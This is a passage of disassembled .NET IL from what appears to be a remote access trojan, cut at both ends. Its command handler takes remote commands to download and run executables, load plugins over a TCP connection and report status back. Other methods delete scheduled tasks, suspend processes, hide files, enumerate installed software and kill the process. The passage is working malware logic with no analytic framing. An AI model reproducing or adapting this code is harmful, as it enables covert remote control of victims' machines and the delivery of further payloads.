      IL_09a6:  bne.un     IL_0a4e

      IL_09ab:  ldloc.1
      IL_09ac:  ldc.i4.1
      IL_09ad:  ldelem.ref
      IL_09ae:  stloc.s    VB$t_string$L3
      IL_09b0:  ldloc.s    VB$t_string$L3
      IL_09b2:  ldstr      "~"
      IL_09b7:  ldc.i4.0
      IL_09b8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_09bd:  ldc.i4.0
      IL_09be:  bne.un.s   IL_09dc

      IL_09c0:  ldsfld     string F.P::Stu
      IL_09c5:  ldstr      ".ini"
      IL_09ca:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_09cf:  ldloc.1
      IL_09d0:  ldc.i4.3
      IL_09d1:  ldelem.ref
      IL_09d2:  call       void [mscorlib]System.IO.File::WriteAllText(string,
                                                                       string)
      IL_09d7:  leave      IL_0e1f

      IL_09dc:  ldloc.s    VB$t_string$L3
      IL_09de:  ldstr      "*!"
      IL_09e3:  ldc.i4.0
      IL_09e4:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_09e9:  ldc.i4.0
      IL_09ea:  bne.un.s   IL_09fb

      IL_09ec:  ldsfld     string F.P::SeN
      IL_09f1:  call       void F.P::DS(string)
      IL_09f6:  leave      IL_0e1f

      IL_09fb:  ldloc.s    VB$t_string$L3
      IL_09fd:  ldstr      "!"
      IL_0a02:  ldc.i4.0
      IL_0a03:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0a08:  ldc.i4.0
      IL_0a09:  bne.un.s   IL_0a1a

      IL_0a0b:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0a10:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_0a15:  leave      IL_0e1f

      IL_0a1a:  ldloc.s    VB$t_string$L3
      IL_0a1c:  ldstr      "@"
      IL_0a21:  ldc.i4.0
      IL_0a22:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0a27:  ldc.i4.0
      IL_0a28:  bne.un.s   IL_0a49

      IL_0a2a:  ldsfld     class [mscorlib]System.IO.FileInfo F.P::LO
      IL_0a2f:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0a34:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_0a39:  pop
      IL_0a3a:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0a3f:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_0a44:  leave      IL_0e1f

      IL_0a49:  leave      IL_0e1f

      IL_0a4e:  ldloc.s    S4
      IL_0a50:  ldstr      "up"
      IL_0a55:  ldc.i4.0
      IL_0a56:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0a5b:  ldc.i4.0
      IL_0a5c:  beq.s      IL_0a63

      IL_0a5e:  br         IL_0be9

      IL_0a63:  ldnull
      IL_0a64:  stloc.3
      IL_0a65:  ldloc.1
      IL_0a66:  ldc.i4.1
      IL_0a67:  ldelem.ref
      IL_0a68:  ldc.i4.0
      IL_0a69:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_0a6e:  ldc.i4.s   31
      IL_0a70:  bne.un     IL_0af8

      .try
      {
        IL_0a75:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0a7a:  stloc.s    S3
        IL_0a7c:  ldloc.1
        IL_0a7d:  ldc.i4.0
        IL_0a7e:  ldelem.ref
        IL_0a7f:  ldsfld     string F.P::Y
        IL_0a84:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0a89:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_0a8e:  stloc.s    num4
        IL_0a90:  ldloc.s    S3
        IL_0a92:  ldarg.0
        IL_0a93:  ldloc.s    num4
        IL_0a95:  ldarg.0
        IL_0a96:  ldlen
        IL_0a97:  conv.ovf.i4
        IL_0a98:  ldloc.s    num4
        IL_0a9a:  sub.ovf
        IL_0a9b:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0aa0:  ldloc.s    S3
        IL_0aa2:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0aa7:  call       uint8[] F.P::Z(uint8[])
        IL_0aac:  call       uint8[] F.P::Z(uint8[])
        IL_0ab1:  call       uint8[] F.P::Z(uint8[])
        IL_0ab6:  call       uint8[] F.P::Z(uint8[])
        IL_0abb:  stloc.3
        IL_0abc:  leave      IL_0b43

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0ac1:  dup
        IL_0ac2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0ac7:  stloc.s    V_48
        IL_0ac9:  ldstr      "Pi"
        IL_0ace:  ldsfld     string F.P::Y
        IL_0ad3:  ldstr      "Update ERROR"
        IL_0ad8:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0add:  call       bool F.P::Send(string)
        IL_0ae2:  pop
        IL_0ae3:  ldstr      "Ti"
        IL_0ae8:  call       bool F.P::Send(string)
        IL_0aed:  pop
        IL_0aee:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0af3:  leave      IL_0e1f

      }  // end handler
      IL_0af8:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_0afd:  stloc.s    C1
      .try
      {
        IL_0aff:  ldloc.s    C1
        IL_0b01:  ldloc.1
        IL_0b02:  ldc.i4.1
        IL_0b03:  ldelem.ref
        IL_0b04:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_0b09:  stloc.3
        IL_0b0a:  leave.s    IL_0b43

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0b0c:  dup
        IL_0b0d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0b12:  stloc.s    V_49
        IL_0b14:  ldstr      "Pi"
        IL_0b19:  ldsfld     string F.P::Y
        IL_0b1e:  ldstr      "Update ERROR"
        IL_0b23:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0b28:  call       bool F.P::Send(string)
        IL_0b2d:  pop
        IL_0b2e:  ldstr      "Ti"
        IL_0b33:  call       bool F.P::Send(string)
        IL_0b38:  pop
        IL_0b39:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0b3e:  leave      IL_0e1f

      }  // end handler
      IL_0b43:  nop
      IL_0b44:  ldstr      "Ti"
      IL_0b49:  call       bool F.P::Send(string)
      IL_0b4e:  pop
      IL_0b4f:  call       string [mscorlib]System.IO.Path::GetTempFileName()
      IL_0b54:  ldstr      ".exe"
      IL_0b59:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0b5e:  stloc.s    FN
      .try
      {
        IL_0b60:  ldstr      "Pi"
        IL_0b65:  ldsfld     string F.P::Y
        IL_0b6a:  ldstr      "Updating To "
        IL_0b6f:  ldloc.s    FN
        IL_0b71:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_0b76:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_0b7b:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0b80:  call       bool F.P::Send(string)
        IL_0b85:  pop
        IL_0b86:  ldc.i4     0x7d0
        IL_0b8b:  call       object F.P::Thr(int32)
        IL_0b90:  pop
        IL_0b91:  ldloc.s    FN
        IL_0b93:  ldloc.3
        IL_0b94:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_0b99:  ldloc.s    FN
        IL_0b9b:  ldstr      ".."
        IL_0ba0:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                                string)
        IL_0ba5:  pop
        IL_0ba6:  ldstr      "ud"
        IL_0bab:  call       bool F.P::Send(string)
        IL_0bb0:  pop
        IL_0bb1:  leave      IL_0e1f

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0bb6:  dup
        IL_0bb7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0bbc:  stloc.s    ex5
        IL_0bbe:  ldstr      "Pi"
        IL_0bc3:  ldsfld     string F.P::Y
        IL_0bc8:  ldstr      "Update ERROR "
        IL_0bcd:  ldloc.s    ex5
        IL_0bcf:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_0bd4:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0bd9:  call       bool F.P::Send(string)
        IL_0bde:  pop
        IL_0bdf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0be4:  leave      IL_0e1f

      }  // end handler
      IL_0be9:  ldloc.s    S4
      IL_0beb:  ldstr      "Ex"
      IL_0bf0:  ldc.i4.0
      IL_0bf1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0bf6:  ldc.i4.0
      IL_0bf7:  bne.un     IL_0c90

      IL_0bfc:  ldsfld     object F.P::PLG
      IL_0c01:  brtrue.s   IL_0c35

      IL_0c03:  ldstr      "PLG"
      IL_0c08:  call       bool F.P::Send(string)
      IL_0c0d:  pop
      IL_0c0e:  ldc.i4.0
      IL_0c0f:  stloc.s    N5
      IL_0c11:  br.s       IL_0c21

      IL_0c13:  ldloc.s    N5
      IL_0c15:  ldc.i4.1
      IL_0c16:  add.ovf
      IL_0c17:  stloc.s    N5
      IL_0c19:  ldc.i4.s   100
      IL_0c1b:  call       object F.P::Thr(int32)
      IL_0c20:  pop
      IL_0c21:  ldsfld     object F.P::PLG
      IL_0c26:  ldnull
      IL_0c27:  ceq
      IL_0c29:  ldc.i4.0
      IL_0c2a:  ceq
      IL_0c2c:  ldloc.s    N5
      IL_0c2e:  ldc.i4.s   20
      IL_0c30:  ceq
      IL_0c32:  or
      IL_0c33:  brfalse.s  IL_0c13

      IL_0c35:  ldsfld     object F.P::PLG
      IL_0c3a:  ldnull
      IL_0c3b:  ldstr      "ind"
      IL_0c40:  ldc.i4.1
      IL_0c41:  newarr     [mscorlib]System.Object
      IL_0c46:  stloc.s    VB$t_array$S1
      IL_0c48:  ldloc.s    VB$t_array$S1
      IL_0c4a:  ldc.i4.0
      IL_0c4b:  ldarg.0
      IL_0c4c:  stelem.ref
      IL_0c4d:  ldloc.s    VB$t_array$S1
      IL_0c4f:  stloc.s    VB$t_array$S2
      IL_0c51:  ldloc.s    VB$t_array$S2
      IL_0c53:  ldnull
      IL_0c54:  ldnull
      IL_0c55:  ldc.i4.1
      IL_0c56:  newarr     [mscorlib]System.Boolean
      IL_0c5b:  stloc.s    VB$t_array$S3
      IL_0c5d:  ldloc.s    VB$t_array$S3
      IL_0c5f:  ldc.i4.0
      IL_0c60:  ldc.i4.1
      IL_0c61:  stelem.i1
      IL_0c62:  ldloc.s    VB$t_array$S3
      IL_0c64:  ldc.i4.1
      IL_0c65:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_0c6a:  pop
      IL_0c6b:  ldloc.s    VB$t_array$S3
      IL_0c6d:  ldc.i4.0
      IL_0c6e:  ldelem.i1
      IL_0c6f:  brfalse.s  IL_0c90

      IL_0c71:  ldloc.s    VB$t_array$S2
      IL_0c73:  ldc.i4.0
      IL_0c74:  ldelem.ref
      IL_0c75:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0c7a:  ldtoken    uint8[]
      IL_0c7f:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_0c84:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_0c89:  castclass  uint8[]
      IL_0c8e:  starg.s    b
      IL_0c90:  ldloc.s    S4
      IL_0c92:  ldstr      "PLG"
      IL_0c97:  ldc.i4.0
      IL_0c98:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0c9d:  ldc.i4.0
      IL_0c9e:  bne.un     IL_0d87

      IL_0ca3:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0ca8:  stloc.s    V1
      IL_0caa:  ldloc.1
      IL_0cab:  ldc.i4.0
      IL_0cac:  ldelem.ref
      IL_0cad:  ldsfld     string F.P::Y
      IL_0cb2:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0cb7:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0cbc:  stloc.s    N6
      IL_0cbe:  ldloc.s    V1
      IL_0cc0:  ldarg.0
      IL_0cc1:  ldloc.s    N6
      IL_0cc3:  ldarg.0
      IL_0cc4:  ldlen
      IL_0cc5:  conv.ovf.i4
      IL_0cc6:  ldloc.s    N6
      IL_0cc8:  sub.ovf
      IL_0cc9:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0cce:  ldloc.s    V1
      IL_0cd0:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0cd5:  call       uint8[] F.P::Z(uint8[])
      IL_0cda:  stloc.s    SQ
      IL_0cdc:  ldloc.s    SQ
      IL_0cde:  call       uint8[] F.P::Z(uint8[])
      IL_0ce3:  stloc.s    SE
      IL_0ce5:  ldloc.s    SE
      IL_0ce7:  call       uint8[] F.P::Z(uint8[])
      IL_0cec:  stloc.s    SR
      IL_0cee:  ldloc.s    SR
      IL_0cf0:  call       uint8[] F.P::Z(uint8[])
      IL_0cf5:  ldstr      "A"
      IL_0cfa:  call       object F.P::P00(uint8[],
                                           string)
      IL_0cff:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0d04:  stsfld     object F.P::PLG
      IL_0d09:  ldsfld     object F.P::PLG
      IL_0d0e:  ldnull
      IL_0d0f:  ldstr      "H"
      IL_0d14:  ldc.i4.1
      IL_0d15:  newarr     [mscorlib]System.Object
      IL_0d1a:  stloc.s    VB$t_array$S2
      IL_0d1c:  ldloc.s    VB$t_array$S2
      IL_0d1e:  ldc.i4.0
      IL_0d1f:  call       object F.P::MH()
      IL_0d24:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0d29:  stelem.ref
      IL_0d2a:  ldloc.s    VB$t_array$S2
      IL_0d2c:  ldnull
      IL_0d2d:  ldnull
      IL_0d2e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0d33:  ldsfld     object F.P::PLG
      IL_0d38:  ldnull
      IL_0d39:  ldstr      "P"
      IL_0d3e:  ldc.i4.1
      IL_0d3f:  newarr     [mscorlib]System.Object
      IL_0d44:  stloc.s    VB$t_array$S2
      IL_0d46:  ldloc.s    VB$t_array$S2
      IL_0d48:  ldc.i4.0
      IL_0d49:  call       string F.P::NPn()
      IL_0d4e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_0d53:  box        [mscorlib]System.Int32
      IL_0d58:  stelem.ref
      IL_0d59:  ldloc.s    VB$t_array$S2
      IL_0d5b:  ldnull
      IL_0d5c:  ldnull
      IL_0d5d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0d62:  ldsfld     object F.P::PLG
      IL_0d67:  ldnull
      IL_0d68:  ldstr      "C"
      IL_0d6d:  ldc.i4.1
      IL_0d6e:  newarr     [mscorlib]System.Object
      IL_0d73:  stloc.s    VB$t_array$S2
      IL_0d75:  ldloc.s    VB$t_array$S2
      IL_0d77:  ldc.i4.0
      IL_0d78:  ldsfld     class [System]System.Net.Sockets.TcpClient F.P::C
      IL_0d7d:  stelem.ref
      IL_0d7e:  ldloc.s    VB$t_array$S2
      IL_0d80:  ldnull
      IL_0d81:  ldnull
      IL_0d82:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0d87:  leave      IL_0e1f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0d8c:  dup
      IL_0d8d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0d92:  stloc.s    ex6
      IL_0d94:  ldloc.1
      IL_0d95:  ldlen
      IL_0d96:  conv.ovf.i4
      IL_0d97:  ldc.i4.0
      IL_0d98:  ble.s      IL_0dc5

      IL_0d9a:  ldloc.1
      IL_0d9b:  ldc.i4.0
      IL_0d9c:  ldelem.ref
      IL_0d9d:  ldstr      "Ex"
      IL_0da2:  ldc.i4.0
      IL_0da3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0da8:  ldc.i4.0
      IL_0da9:  ceq
      IL_0dab:  ldloc.1
      IL_0dac:  ldc.i4.0
      IL_0dad:  ldelem.ref
      IL_0dae:  ldstr      "PLG"
      IL_0db3:  ldc.i4.0
      IL_0db4:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0db9:  ldc.i4.0
      IL_0dba:  ceq
      IL_0dbc:  or
      IL_0dbd:  brfalse.s  IL_0dc5

      IL_0dbf:  ldnull
      IL_0dc0:  stsfld     object F.P::PLG
      .try
      {
        IL_0dc5:  ldc.i4.5
        IL_0dc6:  newarr     [mscorlib]System.String
        IL_0dcb:  stloc.s    VB$t_array$S0
        IL_0dcd:  ldloc.s    VB$t_array$S0
        IL_0dcf:  ldc.i4.0
        IL_0dd0:  ldstr      "ER"
        IL_0dd5:  stelem.ref
        IL_0dd6:  ldloc.s    VB$t_array$S0
        IL_0dd8:  ldc.i4.1
        IL_0dd9:  ldsfld     string F.P::Y
        IL_0dde:  stelem.ref
        IL_0ddf:  ldloc.s    VB$t_array$S0
        IL_0de1:  ldc.i4.2
        IL_0de2:  ldloc.1
        IL_0de3:  ldc.i4.0
        IL_0de4:  ldelem.ref
        IL_0de5:  stelem.ref
        IL_0de6:  ldloc.s    VB$t_array$S0
        IL_0de8:  ldc.i4.3
        IL_0de9:  ldsfld     string F.P::Y
        IL_0dee:  stelem.ref
        IL_0def:  ldloc.s    VB$t_array$S0
        IL_0df1:  ldc.i4.4
        IL_0df2:  ldloc.s    ex6
        IL_0df4:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_0df9:  stelem.ref
        IL_0dfa:  ldloc.s    VB$t_array$S0
        IL_0dfc:  call       string [mscorlib]System.String::Concat(string[])
        IL_0e01:  call       bool F.P::Send(string)
        IL_0e06:  pop
        IL_0e07:  leave.s    IL_0e18

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0e09:  dup
        IL_0e0a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0e0f:  stloc.s    V_58
        IL_0e11:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0e16:  leave.s    IL_0e18

      }  // end handler
      IL_0e18:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0e1d:  leave.s    IL_0e1f

    }  // end handler
    IL_0e1f:  ret
  } // end of method P::Ind

  .method private static void  DS(string NS) cil managed
  {
    // Code size       28 (0x1c)
    .maxstack  4
    .locals init ([0] string C)
    IL_0000:  ldstr      "SCHTASKS /Delete /TN \""
    IL_0005:  ldarg.0
    IL_0006:  ldstr      "\" /F"
    IL_000b:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0010:  stloc.0
    IL_0011:  ldloc.0
    IL_0012:  ldc.i4.0
    IL_0013:  ldc.i4.1
    IL_0014:  ldc.i4.m1
    IL_0015:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                               valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                               bool,
                                                                                               int32)
    IL_001a:  pop
    IL_001b:  ret
  } // end of method P::DS

  .method public static bool  RP(int32 ID) cil managed
  {
    // Code size       35 (0x23)
    .maxstack  2
    .locals init ([0] bool Fl,
             [1] bool RP,
             [2] class [mscorlib]System.Exception V_2)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_0006:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
      IL_000b:  call       bool F.P::NtResumeProcess(native int)
      IL_0010:  stloc.0
      IL_0011:  leave.s    IL_0021

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0013:  dup
      IL_0014:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0019:  stloc.2
      IL_001a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_001f:  leave.s    IL_0021

    }  // end handler
    IL_0021:  ldloc.0
    IL_0022:  ret
  } // end of method P::RP

  .method public static bool  SP(int32 ID) cil managed
  {
    // Code size       37 (0x25)
    .maxstack  2
    .locals init ([0] bool Fl,
             [1] bool SP,
             [2] class [mscorlib]System.Exception exception1)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_0006:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
      IL_000b:  call       bool F.P::NtSuspendProcess(native int)
      IL_0010:  stloc.0
      IL_0011:  leave.s    IL_0023

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0013:  dup
      IL_0014:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0019:  stloc.2
      IL_001a:  ldc.i4.0
      IL_001b:  stloc.0
      IL_001c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0021:  leave.s    IL_0023

    }  // end handler
    IL_0023:  ldloc.0
    IL_0024:  ret
  } // end of method P::SP

  .method public static object  Hx(string k) cil managed
  {
    // Code size       9 (0x9)
    .maxstack  2
    .locals init ([0] object Hx)
    IL_0000:  ldarg.0
    IL_0001:  ldc.i4.2
    IL_0002:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                      valuetype [mscorlib]System.IO.FileAttributes)
    IL_0007:  ldloc.0
    IL_0008:  ret
  } // end of method P::Hx

  .method public static string  NPn() cil managed
  {
    // Code size       32 (0x20)
    .maxstack  2
    .locals init ([0] string NPn)
    IL_0000:  ldsfld     int32 F.P::NP
    IL_0005:  ldsfld     string[] F.P::PN
    IL_000a:  ldlen
    IL_000b:  conv.ovf.i4
    IL_000c:  blt.s      IL_0014

    IL_000e:  ldc.i4.0
    IL_000f:  stsfld     int32 F.P::NP
    IL_0014:  ldsfld     string[] F.P::PN
    IL_0019:  ldsfld     int32 F.P::NP
    IL_001e:  ldelem.ref
    IL_001f:  ret
  } // end of method P::NPn

  .method public static string  INS() cil managed
  {
    // Code size       192 (0xc0)
    .maxstack  4
    .locals init ([0] string INS,
             [1] string N,
             [2] string S,
             [3] string S2,
             [4] string T,
             [5] string T1,
             [6] int32 VB$t_i4$L0,
             [7] string[] VB$t_array$L0,
             [8] string[] VB$t_array$S1)
    IL_0000:  ldstr      "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\"
    IL_0005:  stloc.1
    IL_0006:  ldstr      ""
    IL_000b:  stloc.2
    IL_000c:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::LocalMachine
    IL_0011:  ldloc.1
    IL_0012:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
    IL_0017:  callvirt   instance string[] [mscorlib]Microsoft.Win32.RegistryKey::GetSubKeyNames()
    IL_001c:  stloc.s    VB$t_array$L0
    IL_001e:  ldc.i4.0
    IL_001f:  stloc.s    VB$t_i4$L0
    IL_0021:  br         IL_00b3

    IL_0026:  ldloc.s    VB$t_array$L0
    IL_0028:  ldloc.s    VB$t_i4$L0
    IL_002a:  ldelem.ref
    IL_002b:  stloc.3
    IL_002c:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::LocalMachine
    IL_0031:  ldloc.1
    IL_0032:  ldloc.3
    IL_0033:  ldstr      "\\"
    IL_0038:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_003d:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
    IL_0042:  ldstr      "DisplayName"
    IL_0047:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string)
    IL_004c:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0051:  stloc.s    T
    IL_0053:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::LocalMachine
    IL_0058:  ldloc.1
    IL_0059:  ldloc.3
    IL_005a:  ldstr      "\\"
    IL_005f:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0064:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
    IL_0069:  ldstr      "DisplayVersion"
    IL_006e:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string)
    IL_0073:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0078:  stloc.s    T1
    IL_007a:  ldc.i4.5
    IL_007b:  newarr     [mscorlib]System.String
    IL_0080:  stloc.s    VB$t_array$S1
    IL_0082:  ldloc.s    VB$t_array$S1
    IL_0084:  ldc.i4.0
    IL_0085:  ldloc.2
    IL_0086:  stelem.ref
    IL_0087:  ldloc.s    VB$t_array$S1
    IL_0089:  ldc.i4.1
    IL_008a:  ldloc.s    T
    IL_008c:  stelem.ref
    IL_008d:  ldloc.s    VB$t_array$S1
    IL_008f:  ldc.i4.2
    IL_0090:  ldstr      "}{"
    IL_0095:  stelem.ref
    IL_0096:  ldloc.s    VB$t_array$S1
    IL_0098:  ldc.i4.3
    IL_0099:  ldloc.s    T1
    IL_009b:  stelem.ref
    IL_009c:  ldloc.s    VB$t_array$S1
    IL_009e:  ldc.i4.4
    IL_009f:  ldstr      "}{"
    IL_00a4:  stelem.ref
    IL_00a5:  ldloc.s    VB$t_array$S1
    IL_00a7:  call       string [mscorlib]System.String::Concat(string[])
    IL_00ac:  stloc.2
    IL_00ad:  ldloc.s    VB$t_i4$L0
    IL_00af:  ldc.i4.1
    IL_00b0:  add.ovf
    IL_00b1:  stloc.s    VB$t_i4$L0
    IL_00b3:  ldloc.s    VB$t_i4$L0
    IL_00b5:  ldloc.s    VB$t_array$L0
    IL_00b7:  ldlen
    IL_00b8:  conv.ovf.i4
    IL_00b9:  blt        IL_0026

    IL_00be:  ldloc.2
    IL_00bf:  ret
  } // end of method P::INS

  .method public static object  MH() cil managed
  {
    // Code size       32 (0x20)
    .maxstack  2
    .locals init ([0] object MH)
    IL_0000:  ldsfld     int32 F.P::NH
    IL_0005:  ldsfld     string[] F.P::HH
    IL_000a:  ldlen
    IL_000b:  conv.ovf.i4
    IL_000c:  blt.s      IL_0014

    IL_000e:  ldc.i4.0
    IL_000f:  stsfld     int32 F.P::NH
